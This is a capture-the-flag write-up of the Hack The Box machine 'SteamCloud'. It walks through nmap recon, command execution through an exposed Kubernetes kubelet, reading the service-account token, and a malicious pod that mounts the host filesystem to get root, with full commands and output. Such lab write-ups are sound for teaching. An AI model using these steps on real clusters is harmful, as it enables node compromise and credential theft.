---
title: "SteamCloud"
date: 2025-08-21 13:39:00 +0500
categories: [Boxes]
tags: [HTB, Box, Linux, Easy, Kubernetes Exploitation, Exposed Kubelet, Malicious Pod]
---

## Recon

### Port Discovery

```bash
sudo nmap -PN -sC -sV -oN steamCloud 10.10.11.133
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 13:46 PKT
Nmap scan report for 10.10.11.133
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA)
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA)
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519)
8443/tcp open  ssl/http Golang net/http server
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2025-08-20T08:19:01
|_Not valid after:  2028-08-20T08:19:01
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (application/json).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 0e72dbfb-2b96-497b-be5a-15251452fea5
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: e26edf2b-4856-4b04-914f-6e3560a168ab
|     X-Kubernetes-Pf-Prioritylevel-Uid: e3a0db79-92fd-4aa2-a94d-d8214b95e9df
|     Date: Thu, 21 Aug 2025 08:21:43 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 53dafeb3-0cb4-4555-838e-8ffe97b40eb3
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: e26edf2b-4856-4b04-914f-6e3560a168ab
|     X-Kubernetes-Pf-Prioritylevel-Uid: e3a0db79-92fd-4aa2-a94d-d8214b95e9df
|     Date: Thu, 21 Aug 2025 08:21:42 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: d35507d0-5df8-48d7-8a63-a8e391e73e6b
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: e26edf2b-4856-4b04-914f-6e3560a168ab
|     X-Kubernetes-Pf-Prioritylevel-Uid: e3a0db79-92fd-4aa2-a94d-d8214b95e9df
|     Date: Thu, 21 Aug 2025 08:21:42 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=8/21%Time=68A6DCE2%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x2053daf
SF:eb3-0cb4-4555-838e-8ffe97b40eb3\r\nCache-Control:\x20no-cache,\x20priva
SF:te\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20e26edf2b-4856-4b04-914f-6e
SF:3560a168ab\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20e3a0db79-92fd-4aa2-
SF:a94d-d8214b95e9df\r\nDate:\x20Thu,\x2021\x20Aug\x202025\x2008:21:42\x20
SF:GMT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVersion\
SF:":\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden
SF::\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/
SF:\\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTTP
SF:Options,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20d35507d0-5df
SF:8-48d7-8a63-a8e391e73e6b\r\nCache-Control:\x20no-cache,\x20private\r\nC
SF:ontent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\
SF:r\nX-Kubernetes-Pf-Flowschema-Uid:\x20e26edf2b-4856-4b04-914f-6e3560a16
SF:8ab\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20e3a0db79-92fd-4aa2-a94d-d8
SF:214b95e9df\r\nDate:\x20Thu,\x2021\x20Aug\x202025\x2008:21:42\x20GMT\r\n
SF:Content-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\
SF:",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20Us
SF:er\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"/\\\
SF:"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOhF
SF:ourRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x200e72dbfb-
SF:2b96-497b-be5a-15251452fea5\r\nCache-Control:\x20no-cache,\x20private\r
SF:\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosni
SF:ff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20e26edf2b-4856-4b04-914f-6e3560
SF:a168ab\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20e3a0db79-92fd-4aa2-a94d
SF:-d8214b95e9df\r\nDate:\x20Thu,\x2021\x20Aug\x202025\x2008:21:43\x20GMT\
SF:r\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"
SF:v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x2
SF:0User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice
SF:\x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\"
SF::{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.07 seconds
```

The `nmap` results are unusual. We have an HTTP server on Port `8443` and I see lots of `kubernetes` in there.

We will do an all ports scan:

```bash
nmap 10.10.11.133 --max-retries=0 -T4 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 14:32 PKT
Warning: 10.10.11.133 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.10.11.133
Host is up (0.084s latency).
Not shown: 47968 closed tcp ports (reset), 17562 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
2379/tcp  open  etcd-client
8443/tcp  open  https-alt
10250/tcp open  unknown
10256/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 28.15 seconds
```

We have an exposed kubelet on Port 10250, and 10256. 

Kubelet allows for Direct Node Access, Privilege Escalation, Information Disclosure, Lateral Movement, and Persistence.

### Enumerating Kubelet

We will start by enumerating kubelet:

```bash
curl -k https://10.10.11.133:10250/healthz
ok
```

A response means we can do more. Now we will try to dump pods information:

```bash
curl -k https://10.10.11.133:10250/pods

{"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"storage-provisioner","namespace":"kube-system","uid":"070ba9f4-101e-4e06-9423-20b5ebfdc985","resourceVersion":"410","creationTimestamp":"2025-08-21T08:19:15Z","labels":{"addonmanager.kubernetes.io/mode":"Reconcile","integration-test":"storage-provisioner"},"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"
<SNIP>
}
```

We will list pods a bit more elegantly:

```bash
curl -sk https://10.10.11.133:10250/pods | jq '.items[].metadata.name'

"etcd-steamcloud"
"kube-apiserver-steamcloud"
"kube-controller-manager-steamcloud"
"kube-scheduler-steamcloud"
"kube-proxy-8qs6x"
"storage-provisioner"
"coredns-78fcd69978-nqgkw"
"nginx"
```

## Foothold

### Interacting with pods

From the previous pods list most of them were kubernetes component except for nginx. 

We will interact with nginx and retrieve the container name:

```bash
curl -sk https://10.10.11.133:10250/pods \
  | jq '.items[] | select(.metadata.name=="nginx") | .spec.containers[].name'
"nginx"
```

Now, we will try to run commands on the container:

```bash
curl -sk -XPOST \
  "https://10.10.11.133:10250/run/default/nginx/nginx" \
  -d "cmd=id"
uid=0(root) gid=0(root) groups=0(root)
```

We are able to run commands, I tried getting a reverse shell but was unable to do so.

We will just try to enumerate through curl:

```bash
curl -sk -XPOST \
  "https://10.10.11.133:10250/run/default/nginx/nginx" \
  -d "cmd=ls /"
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

On further enumeration we found the token for serviceaccount that could be used to authenticate and interact with the API.

```bash
curl -sk -XPOST \
  "https://10.10.11.133:10250/run/default/nginx/nginx" \
  -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
eyJhbGciOiJSUzI1NiIsImtpZCI6InYwVGZqQmMyVHZ2cUFVVWJrdDFOWTRUWUFwWUd1Y2piTy1NSjdxQ2tFTmMifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzg3MzAzMzM4LCJpYXQiOjE3NTU3NjczMzgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjdkNzE2MmVhLTYwOTEtNGQyOS1hMzI1LTA3MjY4NmZiMDczYyJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjNkOTczZTViLTg1OWQtNDdhOC1iMzkxLWU5MDY1Y2IwODYxYyJ9LCJ3YXJuYWZ0ZXIiOjE3NTU3NzA5NDV9LCJuYmYiOjE3NTU3NjczMzgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.33i9nqiqPZl7eQDeBGQVUSzPPe3lHyh16baangyTEUkBrCmpYfk5lAdBi36zsKW1Hpgui5WKiOPBcWuDk7sF1DCKXGFYI2vCA8_CBGdo8L7ohdvn7Ro1tEag6bgsmAxglf3PF_Y0KBvPaQAlog5IMaJJTHzlxZgY6djmMtJ-zwOazdSLGyZAp9ul7qBhGI3yGUKEMmqhukkZJ2Jo7JIDVAx0MxD4Oes7QVYOeOMkXE8bPGPAL0dRyiwARpXqz44bVOlWgOUSnI2R2zz8EstSTNcxqL6JEWf5koGXbgKfkEb9jvTw8BqEvGgDwdZ2lNtXhaWXQwWUMrWA9DA3YbarSg
```

We will also take the ca.crt

```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.10.11.133:8443/ auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

This tells us that we can create our own pod and what other access we have using the token and cert.

## Shell

I ended up trying to get/spawn a shell again and it worked?

```bash
kubeletctl -s 10.10.11.133 exec "/bin/bash" -p nginx -c nginx
root@nginx:/# whoami
whoami
root
```

I could have had the user flag much earlier but I was never expecting it to be in root directory:

```bash
root@nginx:/home# ls
ls
root@nginx:/home# ls /root/
ls /root/
user.txt
root@nginx:/home# cat /root/user.txt
cat /root/user.txt
b4d514e4f******
```

## Creating our Pod

To get the root flag we will create our own malicious pod:

Let's start with a yaml:

```yaml  
apiVersion: v1 
kind: Pod
metadata:
  name: marsh
  namespace: default
spec:
  containers:
  - name: marsh
    image: nginx:1.14.2
    volumeMounts: 
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:  
      path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Then we will apply it:

```bash
kubectl --token=$token \
  --certificate-authority=ca.crt \
  --server=https://10.10.11.133:8443 \
  apply -f marsh.yaml

pod/nginxt created
```

Afterwards we will verify:

```bash
kubeletctl pods -s 10.10.11.133
┌─────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                                │
├────┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│    │ POD                                │ NAMESPACE   │ CONTAINERS              │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  1 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  2 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  3 │ coredns-78fcd69978-nqgkw           │ kube-system │ coredns                 │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  4 │ nginx                              │ default     │ nginx                   │
│    │                                    │             │                         │
├────┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│  5 │ marsh                              │ default     │ marsh  
```

## Root Flag

```bash
└─$ kubeletctl exec "ls /mnt/" -s 10.10.11.133 -p marsh -c marsh
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
                                                                                                                                            
┌──(kali㉿vm-kali)-[~/htb/steamCloud]
└─$ kubeletctl exec "ls /mnt/root" -s 10.10.11.133 -p marsh -c marsh
root.txt
                                                                                                                                            
┌──(kali㉿vm-kali)-[~/htb/steamCloud]
└─$ kubeletctl exec "cat /mnt/root/root.txt" -s 10.10.11.133 -p marsh -c marsh
55670e66ba*****
```

---
